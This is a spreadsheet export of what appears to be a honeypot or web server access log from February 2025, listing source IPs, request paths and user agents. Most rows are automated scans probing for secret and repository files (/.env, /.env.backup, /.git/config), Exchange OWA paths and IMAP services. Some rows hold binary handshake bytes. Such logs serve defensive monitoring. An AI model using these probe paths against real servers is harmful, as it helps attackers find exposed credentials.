            <text:p>2025-02-24 01:33:0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135.148.63.223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24T01:40:34" calcext:value-type="date">
            <text:p>2025-02-24 01:40:3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15.204.37.23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X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T01:47:31" calcext:value-type="date">
            <text:p>2025-02-24 01:47:3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43.153.87.54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4T02:10:22" calcext:value-type="date">
            <text:p>2025-02-24 02:10:2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147.185.132.8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curl/7.68.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T02:33:52" calcext:value-type="date">
            <text:p>2025-02-24 02:33:5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162.243.200.156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4T02:34:27" calcext:value-type="date">
            <text:p>2025-02-24 02:34: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185.100.87.13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; rv:104.71.6212.24) Gecko/25.2.4212.671 Firefox/2.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T02:59:35" calcext:value-type="date">
            <text:p>2025-02-24 02:59:3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185.193.88.5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Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T03:14:36" calcext:value-type="date">
            <text:p>2025-02-24 03:14:3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123.160.232.5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4T03:59:19" calcext:value-type="date">
            <text:p>2025-02-24 03:59:1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111.113.89.192</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T03:59:34" calcext:value-type="date">
            <text:p>2025-02-24 03:59:3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111.224.220.4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6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T04:00:47" calcext:value-type="date">
            <text:p>2025-02-24 04:00:4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162.216.149.152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4T04:53:23" calcext:value-type="date">
            <text:p>2025-02-24 04:53:2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65.49.1.8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X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T04:54:12" calcext:value-type="date">
            <text:p>2025-02-24 04:54:1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65.49.1.89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X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T04:54:28" calcext:value-type="date">
            <text:p>2025-02-24 04:54:2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65.49.1.8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X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T04:54:33" calcext:value-type="date">
            <text:p>2025-02-24 04:54:3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152.32.201.11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Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:26" calcext:value-type="date">
            <text:p>2025-02-24 05:02:2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152.32.201.119</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/auth/15.0.1497/themes/resources/favicon.ico</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:27" calcext:value-type="date">
            <text:p>2025-02-24 05:02:2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152.32.201.119</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /robots.txt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:27" calcext:value-type="date">
            <text:p>2025-02-24 05:02:2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152.32.201.119</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /sitemap.xml</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:27" calcext:value-type="date">
            <text:p>2025-02-24 05:02:2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152.32.201.119</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /config.json</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:28" calcext:value-type="date">
            <text:p>2025-02-24 05:02:2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152.32.201.11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32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:02:30" calcext:value-type="date">
            <text:p>2025-02-24 05:02:3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138.197.102.13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4T05:39:16" calcext:value-type="date">
            <text:p>2025-02-24 05:39:1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138.197.102.139</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T05:39:17" calcext:value-type="date">
            <text:p>2025-02-24 05:39:1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43.167.232.3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4T06:07:13" calcext:value-type="date">
            <text:p>2025-02-24 06:07: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205.210.31.55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4T06:26:35" calcext:value-type="date">
            <text:p>2025-02-24 06:26:3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205.210.31.55</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001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4T06:26:36" calcext:value-type="date">
            <text:p>2025-02-24 06:26:3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162.216.150.54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4T07:04:07" calcext:value-type="date">
            <text:p>2025-02-24 07:04:0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35.203.211.123</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa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4T07:04:08" calcext:value-type="date">
            <text:p>2025-02-24 07:04:0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34.78.54.18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python-requests/2.32.3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T07:18:08" calcext:value-type="date">
            <text:p>2025-02-24 07:18:0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9tcpid/v1.1.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T07:18:13" calcext:value-type="date">
            <text:p>2025-02-24 07:18:1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project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4T07:18:28" calcext:value-type="date">
            <text:p>2025-02-24 07:18:2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project/frontend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4T07:18:30" calcext:value-type="date">
            <text:p>2025-02-24 07:18:3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.env.backup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4T07:18:32" calcext:value-type="date">
            <text:p>2025-02-24 07:18:3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sandbox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4T07:18:35" calcext:value-type="date">
            <text:p>2025-02-24 07:18:3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core/config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4T07:18:37" calcext:value-type="date">
            <text:p>2025-02-24 07:18:3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.env.tmp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4T07:18:40" calcext:value-type="date">
            <text:p>2025-02-24 07:18:4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var/.env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4T07:18:42" calcext:value-type="date">
            <text:p>2025-02-24 07:18:4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4T07:18:43" calcext:value-type="date">
            <text:p>2025-02-24 07:18:4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45.148.10.90</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /production/.git/config</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>l9explore/1.2.2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T07:18:44" calcext:value-type="date">
            <text:p>2025-02-24 07:18:4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198.235.24.22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4T07:44:23" calcext:value-type="date">
            <text:p>2025-02-24 07:44:2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185.242.226.15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) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T08:33:21" calcext:value-type="date">
            <text:p>2025-02-24 08:33:2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45.144.212.139</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /.git/index</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T08:50:05" calcext:value-type="date">
            <text:p>2025-02-24 08:50:0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205.210.31.42</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application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4T09:04:06" calcext:value-type="date">
            <text:p>2025-02-24 09:04:0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147.185.132.118</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&amp;#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:04:11" calcext:value-type="date">
            <text:p>2025-02-24 09:04:1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198.235.24.94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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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198.235.24.94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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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198.235.24.94</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] ��g�:�EG��N���?���D|�KM��Se�#�w Jg�b�"���6\�S�fJ3�^��Z&amp;�+�/�,�0̨̩�<text:tab/>��</text:p>
            <text:p>���/5�</text:p>
            <text:p>{</text:p>
            <text:p/>
            <text:p/>
            <text:p>�+     3&amp;$ PWw}�u��8�4�N_����h���</text:p>
            <text:p>�P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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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198.235.24.94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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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198.235.24.94</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] ����9T�&amp;�`����Dl�@W��#�� nr�h���/�+�0�,���'�#��<text:tab/>�(�$��</text:p>
            <text:p>���gk39��&lt;=/5�</text:p>
            <text:p>28@fj��5</text:p>
            <text:p/>
            <text:p/>
            <text:p/>
            <text:p>�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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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198.235.24.94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14:44" calcext:value-type="date">
            <text:p>2025-02-24 09:14:4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204.188.228.115</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /.env</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 Keydrop</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:20:18" calcext:value-type="date">
            <text:p>2025-02-24 09:20:1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65.49.20.6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32:11" calcext:value-type="date">
            <text:p>2025-02-24 09:32:1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65.49.20.6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32:24" calcext:value-type="date">
            <text:p>2025-02-24 09:32:2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65.49.20.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001 STARTTLS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32:24" calcext:value-type="date">
            <text:p>2025-02-24 09:32:2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65.49.20.68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32:36" calcext:value-type="date">
            <text:p>2025-02-24 09:32:3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65.49.20.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] {wx����a�Ko���iD�9��*�:��!�C/���/�+����<text:tab/>��</text:p>
            <text:p>/5�</text:p>
            <text:p>4</text:p>
            <text:p/>
            <text:p>�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32:36" calcext:value-type="date">
            <text:p>2025-02-24 09:32:3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65.49.20.68</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] 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32:36" calcext:value-type="date">
            <text:p>2025-02-24 09:32:3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64.62.197.28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; rv:109.0) Gecko/20100101 Firefox/112.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:34:15" calcext:value-type="date">
            <text:p>2025-02-24 09:34:1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64.62.197.28</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HEAD /owa/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:37:16" calcext:value-type="date">
            <text:p>2025-02-24 09:37:1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64.62.197.28</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:37:51" calcext:value-type="date">
            <text:p>2025-02-24 09:37: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64.62.197.17</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /favicon.ico</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:41:43" calcext:value-type="date">
            <text:p>2025-02-24 09:41:4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64.62.197.29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Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:42:52" calcext:value-type="date">
            <text:p>2025-02-24 09:42:5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64.62.197.19</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /owa/auth/x.js</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:43:20" calcext:value-type="date">
            <text:p>2025-02-24 09:43:2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64.62.197.20</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GET /geoserver/web/</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:46:39" calcext:value-type="date">
            <text:p>2025-02-24 09:46:39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34.102.3.213</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OPTIONS /</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:47:10" calcext:value-type="date">
            <text:p>2025-02-24 09:47:1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104.236.145.10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51:25" calcext:value-type="date">
            <text:p>2025-02-24 09:51:2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104.236.145.10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] a001 CAPABILITY</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T09:51:25" calcext:value-type="date">
            <text:p>2025-02-24 09:51:2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162.62.132.25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Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T10:07:52" calcext:value-type="date">
            <text:p>2025-02-24 10:07:5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45.227.254.152</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP] Connection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T10:33:33" calcext:value-type="date">
            <text:p>2025-02-24 10:33:3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45.227.254.152</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>[IMAP CMD] /*�Cookie: mstshash=Administr</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IMAP Client</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T10:33:33" calcext:value-type="date">
            <text:p>2025-02-24 10:33:3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185.224.0.236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Go-http-client/1.1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="date" office:date-value="2025-02-24T10:36:28" calcext:value-type="date">
            <text:p>2025-02-24 10:36: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3:09:28.248155961</meta:creation-date>
    <dc:date>2025-02-24T13:09:59.570489428</dc:date>
    <meta:editing-duration>PT32S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="1" meta:cell-count="5153" meta:object-count="0"/>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>